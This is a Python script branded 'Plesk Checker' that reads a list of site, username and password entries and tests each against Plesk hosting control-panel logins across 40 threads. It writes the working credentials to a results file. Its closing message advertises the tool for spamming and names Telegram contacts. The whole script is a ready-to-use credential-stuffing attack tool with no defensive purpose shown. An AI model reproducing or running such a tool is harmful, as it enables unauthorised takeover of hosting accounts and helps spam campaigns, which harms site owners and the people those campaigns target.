from concurrent.futures import ThreadPoolExecutor
import requests
from requests.exceptions import RequestException
import logging
from colorama import Fore, init

init(autoreset=True)

logging.basicConfig(level=logging.CRITICAL, format='%(asctime)s - %(levelname)s - %(message)s')

headers = { 
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': 'text/plain'
}

def print_banner():
    banner_part1 = Fore.BLUE + """
    ██████╗ ██╗     ███████╗███████╗██╗  ██╗     ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
    ██╔══██╗██║     ██╔════╝██╔════╝██║ ██╔╝    ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
    ██████╔╝██║     █████╗  ███████╗█████╔╝     ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
    ██╔═══╝ ██║     ██╔══╝  ╚════██║██╔═██╗     ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
    ██║     ███████╗███████╗███████║██║  ██╗    ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
    ╚═╝     ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝     ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
    """

    banner_part2 = Fore.MAGENTA + """

    ██╗░░░██╗░██████╗████████╗░██████╗░
    ██║░░░██║██╔════╝╚══██╔══╝██╔════╝░
    ╚██╗░██╔╝╚█████╗░░░░██║░░░██║░░██╗░
    ░╚████╔╝░░╚═══██╗░░░██║░░░██║░░╚██╗
    ░░╚██╔╝░░██████╔╝░░░██║░░░╚██████╔╝
    ░░░╚═╝░░░╚═════╝░░░░╚═╝░░░░╚═════╝░
    """

    print(banner_part1 + banner_part2)

def parse_line(line):
    if '|' in line:
        parts = line.split('|')
    else:
        parts = line.split()
    return parts[0], parts[1], parts[2]

def check(line):
    site, user, passwd = parse_line(line)
    try:
        response = requests.post(url=site, headers=headers, data={
            'login_name': user,
            'passwd': passwd,
            'send': 'Log In'
        }, timeout=5)

        if 'Applications' in response.text:
            print(Fore.GREEN + f"Valid --> {site}")
            with open("Good_Plesk.txt", "a", encoding="utf-8") as good_file:
                good_file.write(f"{site}|{user}|{passwd}\n")
        else:
            print(Fore.RED + f"Invalid --> {site}")
            with open("Bad_Plesk.txt", "a", encoding="utf-8") as bad_file:
                bad_file.write(f"{site}|{user}|{passwd}\n")
    except RequestException as e:
        print(Fore.RED + f"Invalid --> {site}")
        with open("Bad_Plesk.txt", "a", encoding="utf-8") as bad_file:
            bad_file.write(f"{site}|{user}|{passwd}\n")

def load_list(filename):
    try:
        with open(filename, 'r', encoding="utf-8") as file:
            lines = file.read().splitlines()
        with ThreadPoolExecutor(max_workers=40) as executor:
            executor.map(check, lines)
    except Exception as e:
        print(Fore.RED + "An error occurred while processing the list.")

def print_farewell_message():
    message = Fore.CYAN + """
Thank you for using our tool! For more tools and information about spamming, 
join our Telegram channel: @z3xploit.

For direct contact and inquiries, reach out to the owner on Telegram: @z3xrin

List processing complete. Check Good_Plesk.txt and Bad_Plesk.txt for results.
"""
    print(message)

def main():
    print_banner()
    list_file = input("Enter the list filename: ")
    load_list(list_file)
    print_farewell_message()

if __name__ == "__main__":
    main()
